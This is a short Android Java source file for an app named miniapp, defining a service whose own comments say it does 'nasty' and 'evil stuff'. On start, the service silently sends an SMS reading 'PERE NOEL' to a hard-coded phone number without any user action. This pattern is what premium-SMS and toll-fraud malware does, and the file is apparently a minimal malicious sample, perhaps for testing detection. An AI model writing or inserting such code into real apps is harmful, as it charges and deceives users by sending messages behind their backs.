package io.shgck.miniapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

/**
 * A Service that should do nasty stuff.
 */
public class DummyService extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("MINI", "In DummyService.onStartCommand, doing evil stuff");
		
		SmsManager manager = SmsManager.getDefault();
		manager.sendTextMessage("+3336303630", null, "PERE NOEL", null, null);
		
		return Service.START_NOT_STICKY;
	}

}
